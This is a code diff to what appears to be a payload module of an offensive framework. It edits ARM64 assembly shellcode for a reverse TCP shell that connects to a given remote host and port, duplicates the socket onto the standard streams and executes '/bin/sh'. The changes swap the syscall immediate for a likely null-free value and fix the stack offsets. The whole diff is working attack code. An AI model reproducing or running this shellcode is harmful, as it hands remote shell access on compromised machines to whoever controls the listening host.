@@ -50,18 +50,18 @@ class ShellReverseTCP(HatAsm, HatVenom, Words):
             lsr x1, x8, 0x7
             lsl x0, x1, 0x1
             mov x2, xzr
-            svc 0
+            svc 0x1337
 
             mvn x4, x0
             lsl x1, x1, 0x1
             movk x1, 0x{rport.hex()}, lsl 0x10
             movk x1, 0x{rhost[2:].hex()}, lsl 0x20
             movk x1, 0x{rhost[:2].hex()}, lsl 0x30
-            str x1, [sp, 8]
+            str x1, [sp, -8]
             add x1, sp, x2
             mov x2, 0x10
             mov x8, 0xcb
-            svc 0
+            svc 0x1337
 
             lsr x1, x2, 0x2
 
@@ -70,21 +70,21 @@ class ShellReverseTCP(HatAsm, HatVenom, Words):
             lsr x1, x1, 0x1
             mov x2, xzr
             mov x8, 0x18
-            svc 0
+            svc 0x1337
 
             cmp x1, xzr
             bne dup
 
-            mov x1, 0x622f
-            movk x1, 0x6e69, lsl 0x10
-            movk x1, 0x732f, lsl 0x20
-            movk x1, 0x68, lsl 0x30
-            str x1, [sp, 8]
+            mov x3, 0x622f
+            movk x3, 0x6e69, lsl 0x10
+            movk x3, 0x732f, lsl 0x20
+            movk x3, 0x68, lsl 0x30
+            str x3, [sp, -8]!
             mov x1, xzr
             mov x2, xzr
             add x0, sp, x1
             mov x8, 0xdd
-            svc 0
+            svc 0x1337
         """
 
         if assemble:
